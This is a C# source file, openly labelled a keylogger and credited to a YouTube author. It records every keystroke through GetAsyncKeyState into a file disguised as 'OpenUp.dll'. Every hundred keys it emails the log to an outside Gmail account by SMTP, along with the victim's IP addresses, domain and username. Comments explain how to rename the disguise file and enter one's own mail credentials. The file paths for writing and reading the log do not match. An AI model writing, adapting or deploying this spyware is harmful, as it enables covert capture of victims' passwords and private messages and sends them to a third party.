//Created by zodarixx
//Youtube Channel : https://www.youtube.com/channel/UCqiJLNFRaDI961uSvjLFY5g?view_as=subscriber
//Please do not change the credit thx :)
//To change the delay per key press change Thread.Sleep(your number);
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Net;
using System.Net.Mail;

namespace KeyLogger3
{
    class Program
    {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        // string to hold all of the keystrokes 
        static long numberOfKeystrokes = 0;
        static void Main(string[] args)
        {

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            //You can change the name of the dll file replacing OpenUp.dll to ur name of file (just do that for the line 94 too)
            string path = (filepath + @"\OpenUp.dll");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) 
                {

                }
            }
            //plan 

            //1 - capture keystrokes and display them to the console 

            while (true)
            {
                // pause and let other programs get a chance to run 
                Thread.Sleep(25);

                // check all keys for their state 
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32768)
                    {
                        Console.Write((char) i + ", ");

                        //2 - store the strokes into a text file 

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                        numberOfKeystrokes++;
                        
                        // send every 100 characters
                        if (numberOfKeystrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }
                        
                    }
                }
                        

            }


            //3 - periodically send the contents of the file to an external email address

        } //main

        static void SendNewMessage()
        {
            //send the contents of the text file to an external emai address


            //The code Environment.SpecialFolder.Systeme precise the folder where the dll file will be save
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.System);
            //You can change the name of the dll file replacing OpenUp.dll to ur name of file (just do that for the line 36 too)
            string filePath = folderName + @"\OpenUp.dll";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            //create an email message

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }

            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();



            //Replace xxxxxxx by ur mail
            mailMessage.From = new MailAddress("xxxxxxxx@gmail.com");
            mailMessage.To.Add("xxxxxxxx@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("xxxxxxx@gmail.com", "xxxxxxxxx");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);


        }
    }
}
//credit zodarixx
